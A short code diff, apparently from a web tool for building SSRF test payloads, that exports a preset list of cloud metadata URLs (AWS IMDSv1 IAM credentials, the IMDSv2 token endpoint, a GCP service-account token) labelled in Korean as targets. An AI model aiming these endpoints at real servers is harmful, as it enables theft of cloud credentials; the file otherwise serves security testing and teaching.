@@ -2,7 +2,7 @@ import { useState } from 'react'
 import { DISCLAIMER, Note, Pick, TextInput, Readout, urlEncodeAll } from './shared'
 
 /* ── 노리는 대상 프리셋 ────────────────────────────────────────── */
-const TARGETS = [
+export const TARGETS = [
   { id: 'aws-imds', label: 'AWS EC2 메타데이터 (IMDSv1)', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', host: '169.254.169.254' },
   { id: 'aws-imds-token', label: 'AWS IMDSv2 토큰 요청 (PUT 필요)', url: 'http://169.254.169.254/latest/api/token', host: '169.254.169.254' },
   { id: 'gcp', label: 'GCP 메타데이터 (Metadata-Flavor 헤더 필요)', url: 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', host: '169.254.169.254' },
